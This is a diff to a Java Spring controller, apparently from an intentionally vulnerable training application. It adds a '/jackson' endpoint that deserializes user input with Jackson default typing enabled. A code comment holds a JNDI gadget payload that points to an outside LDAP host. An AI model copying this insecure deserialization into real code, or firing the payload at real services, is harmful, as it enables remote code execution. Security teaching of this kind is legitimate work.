@@ -1,5 +1,6 @@
 package org.joychou.controller;
 
+import com.fasterxml.jackson.databind.ObjectMapper;
 import org.joychou.config.Constants;
 import org.joychou.security.AntObjectInputStream;
 import org.slf4j.Logger;
@@ -81,6 +82,19 @@ public class Deserialize {
         }
 
         return "I'm very OK.";
+    }
+
+    // String payload = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\", {\"jndiNames\":\"ldap://30.196.97.50:1389/yto8pc\"}]";
+    @RequestMapping("/jackson")
+    public void Jackson(String payload) {
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        try {
+            Object obj = mapper.readValue(payload, Object.class);
+            mapper.writeValueAsString(obj);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
 }
